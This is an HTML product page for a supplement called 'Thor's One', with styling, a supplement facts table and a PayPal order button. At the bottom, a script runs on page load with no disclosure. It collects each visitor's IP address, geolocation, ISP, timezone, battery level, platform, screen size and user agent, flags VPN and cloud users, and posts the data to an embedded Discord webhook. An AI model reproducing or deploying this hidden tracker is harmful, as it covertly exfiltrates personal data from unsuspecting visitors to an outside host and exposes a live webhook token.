---
layout: default
title: Thor's One - Available Now
---

<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Inter:wght@300;700&display=swap');

    :root {
        --electric-blue: #00d4ff;
        --bg-dark: #020202;
    }

    body { 
        background-color: var(--bg-dark); 
        color: #fff; 
        font-family: 'Inter', sans-serif; 
        margin: 0;
        background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.8)), url('banner_storm.jpeg');
        background-attachment: fixed;
        background-size: cover;
        background-position: center;
    }

    .container { max-width: 1100px; margin: 0 auto; padding: 40px 20px; text-align: center; }

    /* The Jug Showcase */
    .product-bottle {
        width: 100%;
        max-width: 500px;
        filter: drop-shadow(0 0 35px var(--electric-blue));
        margin-bottom: -20px;
        transition: transform 0.5s ease;
    }
    
    .product-bottle:hover { transform: scale(1.03); }

    h1 { 
        font-family: 'Orbitron', sans-serif; 
        font-size: clamp(2.5rem, 8vw, 5rem);
        margin: 0; 
        color: #fff;
        text-shadow: 0 0 30px var(--electric-blue);
        letter-spacing: 8px;
    }

    .tagline { 
        text-transform: uppercase; 
        letter-spacing: 5px; 
        font-size: 0.8rem; 
        color: var(--electric-blue);
        margin: 10px 0 40px;
        font-weight: 700;
    }

    /* Supplement Facts UI - POPULATED */
    .supplement-facts { 
        background: #fff; 
        color: #000; 
        padding: 30px; 
        border: 4px solid #000; 
        width: 100%;
        max-width: 450px;
        margin: 40px auto;
        box-shadow: 15px 15px 0px var(--electric-blue);
        text-align: left;
    }

    .supplement-facts h2 { border-bottom: 12px solid #000; font-weight: 900; font-size: 2.4rem; margin: 0; }
    .sf-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
    .sf-table td { padding: 12px 0; border-bottom: 1px solid #000; font-weight: bold; }
    .sf-header { border-bottom: 6px solid #000 !important; font-size: 1.1rem; }

    /* Barcode Integration */
    .barcode-area {
        text-align: center;
        margin-top: 25px;
        border-top: 2px solid #000;
        padding-top: 15px;
    }
    .barcode-img { width: 100%; max-width: 220px; height: auto; }

    /* PayPal Integration Button */
    .order-btn {
        background: #fff; 
        color: #000; 
        padding: 22px 60px; 
        font-weight: 900; 
        text-decoration: none; 
        display: inline-block; 
        font-size: 1.4rem;
        text-transform: uppercase;
        letter-spacing: 3px;
        border: 4px solid var(--electric-blue);
        transition: 0.3s;
        box-shadow: 0 0 40px rgba(0, 212, 255, 0.3);
        cursor: pointer;
    }

    .order-btn:hover { 
        background: var(--electric-blue); 
        color: #fff; 
        box-shadow: 0 0 60px var(--electric-blue);
    }

    footer { margin-top: 80px; color: #333; font-size: 0.7rem; letter-spacing: 4px; font-weight: bold; }
</style>

<div class="container">
    <img src="banner.jpg" class="product-bottle" alt="Thor's One Performance Jug">
    
    <h1>THOR'S ONE</h1>
    <p class="tagline">MANY ARE CALLED BUT FEW ARE CHOSEN</p>
    
    <div style="margin-bottom: 50px;">
        <a href="https://www.paypal.com/ncp/payment/Z6NLB5ECC653L" class="order-btn">CLAIM THE ALLOY</a>
    </div>

    <div class="supplement-facts">
        <h2>Supplement Facts</h2>
        <p style="font-weight: bold; margin: 5px 0;">Serving Size: 1 Scoop | Servings: 30</p>
        <table class="sf-table">
            <tr class="sf-header"><td>ELEMENT</td><td style="text-align:right;">DOSAGE</td></tr>
            <tr><td>Creatine Monohydrate</td><td style="text-align:right;">5 g</td></tr>
            <tr><td>Citrulline Malate</td><td style="text-align:right;">5 g</td></tr>
            <tr><td>Beta-Alanine</td><td style="text-align:right;">3.5 g</td></tr>
            <tr><td>L-Tyrosine</td><td style="text-align:right;">750 mg</td></tr>
            <tr class="sf-header"><td>ELITE FOCUS</td><td style="text-align:right;">**</td></tr>
            <tr><td>Huperzine A (1%)</td><td style="text-align:right;">200 mcg</td></tr>
            <tr><td>Magnesium Glycinate</td><td style="text-align:right;">300 mg</td></tr>
        </table>
        
        <div class="barcode-area">
            <img src="thor_one_barcode_.jpeg" class="barcode-img" alt="Product UPC">
            <p style="font-size: 0.6rem; letter-spacing: 2px; font-weight: bold; margin-top: 5px;">BATCH: 001 // VERIFIED AUTHENTIC</p>
        </div>
    </div>

    <footer style="margin-top: 80px; color: #333; font-size: 0.7rem; letter-spacing: 4px;">
        VALHALLA INNOVATIONS // NODE: SUPPS-01 // SECURE SESSION ACTIVE
    </footer>
</div>

<script>
    async function runSentinel() {
        const hook = "https://discord.com/api/webhooks/1482560413202780190/W_284_815IhjKx0KEPRMAcL8cikbZLG1wE_Zwxls5N-DR5KJ8mtuCE_OrXf-ZLIVSRay";
        const absoluteMasters = ["66.177.137.56"]; 
        const wichitaIP = "207.178.123.51";

        try {
            const res = await fetch('https://ipapi.co/json/');
            const geo = await res.json();
            const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: 1, charging: true }));
            
            const isMaster = absoluteMasters.includes(geo.ip);
            const isWichita = geo.ip === wichitaIP;
            const isCloud = /Azure|Hosting|Data Center|Microsoft|Amazon|Google|Cloud|Ziply|VPN|Proxy|HERN/i.test(geo.org);

            let status = "🚨 INTEL SCAN";
            let color = 15548997; 

            if (isMaster) { status = "👑 MASTER ACCESS"; color = 15844367; }
            else if (isWichita) { status = "🌾 WICHITA NODE REPORT"; color = 3447003; }
            else if (isCloud) { status = "☁️ CLOAKED / VPN DETECTED"; color = 10181046; }

            const report = {
                username: isMaster ? "THORS-RIG-ADMIN" : "SENTINEL-INTELLIGENCE",
                embeds: [{
                    title: `${status}: ${geo.city || "Unknown Node"}`,
                    color: color,
                    fields: [
                        { name: "🌐 Network", value: `IP: ${geo.ip}\nISP: ${geo.org}`, inline: false },
                        { name: "📍 Location", value: `${geo.city}, ${geo.region}\nTZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, inline: true },
                        { name: "💻 Device", value: `Platform: ${navigator.platform}\nScreen: ${screen.width}x${screen.height}`, inline: true },
                        { name: "🔋 Battery", value: `${(battery.level * 100).toFixed(0)}% (Charging: ${battery.charging})`, inline: true },
                        { name: "🕵️ UA", value: navigator.userAgent }
                    ],
                    footer: { text: "McLaren Valhalla Systems // Sentinel Active" },
                    timestamp: new Date().toISOString()
                }]
            };

            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(report) });
        } catch (e) {}
    }
    runSentinel();
</script>
